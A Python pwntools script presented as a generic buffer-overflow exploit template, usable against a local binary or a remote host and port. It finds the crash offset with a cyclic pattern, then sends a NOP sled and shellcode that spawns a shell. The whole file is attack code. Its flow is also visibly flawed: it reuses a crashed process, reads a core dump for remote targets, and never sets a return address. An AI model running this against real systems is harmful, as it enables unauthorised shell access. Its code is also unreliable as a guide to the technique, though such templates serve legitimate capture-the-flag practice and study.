#!/usr/bin/env python3
from pwn import *
import sys

def setup_io(target, port=None):
    if port:
        return remote(target, int(port))
    else:
        context.binary = target
        return process(context.binary.path)

def find_offset(io):
    # Generate a cyclic pattern to auto-find the offset
    pattern = cyclic(1024)
    io.sendlineafter("Input:", pattern)  # Adjust based on the prompt
    io.wait()  # Wait for the crash
    core = io.corefile  # Get the core dump
    offset = cyclic_find(core.read(core.rsp, 4))  # Adjust the register as needed
    return offset

def exploit(io, offset, payload):
    # Send the payload based on the found offset and custom shellcode
    io.sendlineafter("Input:", fit({offset: payload}))
    return io.recvall()

def main(target, port=None):
    io = setup_io(target, port)

    # Context setup (adjust according to the target binary)
    context.os = 'linux'
    context.arch = 'amd64'  # Adjust for 32-bit binaries with 'i386'

    offset = find_offset(io)
    log.success(f"Offset found at: {offset} bytes")

    # Craft the payload
    shellcode = asm(shellcraft.sh())  # Assembly shellcode for spawning a shell
    nop_sled = asm('nop') * 100  # NOP sled
    payload = nop_sled + shellcode

    # Run the exploit
    result = exploit(io, offset, payload)
    print(result)

    # Cleanup
    io.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: binary_buffer_overflow_template.py <binary_path|target_host> [port]")
        sys.exit(1)
    main(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None)

